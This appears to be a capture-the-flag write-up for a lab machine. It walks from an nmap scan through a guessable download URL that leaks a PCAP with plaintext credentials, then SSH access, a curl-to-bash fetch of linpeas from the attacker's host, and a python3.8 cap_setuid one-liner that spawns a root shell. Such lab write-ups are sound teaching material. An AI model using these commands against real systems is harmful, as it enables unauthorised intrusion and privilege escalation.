## Report 

We start with the default `nmap` scan.

```bash
nmap $ip -sV
```

We can see some open ports.

<br/>

- 21: FTP
- 22: SSH
- 80: HTTP server 

To interact with the `HTTP` server, we use the browser.  

<br/>

<br/>

We can see a `dashboard` and some clickable content.  

- `Security Snapshot`:

<br/>

<br/>

This make a `PCAP` capturing packets for 5 seconds that I can download.   

- `IP Config`:

<br/>

<br/>

I believe this runs `ifconfig` on the machine.  

- `Network status`:

<br/>

This runs a couple of commands on the machine and output it.  

At first glance, `Command Injection` can be used to gain a foothold but using the low hanging fruit methodology, we can first check the security snapshot as it uses an easy guessed way to save the files on the machine.   

If we check the URL,  `http://10.10.10.245/data/2` the file is referenced as `2`, The first one we tried was referenced as `1`. So maybe there is a file called `0`.  

 <br/> 
<img src="/img/cap_screenshots/Pasted image 20241105212838.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a hit. Downloading the file and reading the content.    

 <br/> 
<img src="/img/cap_screenshots/Pasted image 20241105212927.png" alt="1" style="width:700px; height:auto;">
<br/>

Clear text credentials can be found `nathan:Buck3tH4TF0RM3!`  
We can try to `SSH` and see if it works.   

 <br/>

<br/>

We are inside as the `nathan` user.  

We open a python server on our machine to be able to transfer `linpeas` on the remote machine and run it.  

```bash
curl http://10.10.16.5:8000/linpeas.sh  | bash
```

We get a hit.   

 <br/>

<br/>

We can see the `/usr/bin/python3.8` binary  has a `cap_setuid`. Te exploit this vulnerability, we can use this exploit.   

```bash
/usr/bin/python3.8 -c "import os;os.setuid(0);os.system('/bin/bash')"
```

The exploit was executed successfully.

<br/>

The machine was `pawned` successfully.
